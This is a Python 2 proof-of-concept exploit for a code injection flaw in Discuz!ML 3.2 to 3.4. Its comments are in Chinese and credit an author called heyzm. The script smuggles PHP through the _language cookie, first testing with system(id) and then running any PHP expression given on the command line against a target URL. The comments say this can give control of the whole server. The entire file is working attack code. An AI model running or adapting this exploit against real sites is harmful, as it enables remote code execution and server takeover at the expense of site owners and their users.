# -*- coding:utf-8 -*-
# Discuz ML! V3.X存在代码注入漏洞，攻击者通过精心构建的请求报文可以直接执行恶意的PHP代码，进一步可获取整个网站的服务器权限。
# 漏洞影响版本：
# Discuz!ML v.3.4 、Discuz!ML v.3.2 、Discuz!ML v.3.3
# Author: heyzm
# 
# 
import requests,sys
from requests.packages import urllib3

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"}

def poc(url,eexec):
	flag = url
	if "http://" in url or "https://" in url:
		url = url+'/portal.php'
	else:
		url = 'http://'+url+'/portal.php'
	urllib3.disable_warnings()	
	try:
		sign = requests.get(url,verify=False).headers['Set-cookie'][:9]
	except:
		print '%s not is vulnerable!' % flag
		sys.exit()
	cookie = "%s_saltkey=V2rU23EB;%s_language=en'.system(id).';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,sign,sign,sign,sign)
	res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=5,verify=False)
	if 'groups=' not in res.text:
		print '%s not is vulnerable!' % flag
		sys.exit()
	else:
		cookie = "%s_saltkey=V2rU23EB;%s_language=en'.%s.';%s_lastvisit=1562777028;%s=rrh6or;%s_lastact=1562780628%%09portal.php%%09;%s_sid=rrh6or" % (sign,sign,eexec,sign,sign,sign,sign)
		res = requests.get(url,headers=headers,cookies={"Cookie":cookie},timeout=5,verify=False)
		flag = res.text.index('<!DOCTYPE html')
		print res.text[:flag]
	
if __name__ == '__main__':
	if len(sys.argv) <=2:
		print 'Usage: python poc.py <url> <php function>'
		sys.exit()
	else:
		poc(sys.argv[1],sys.argv[2])
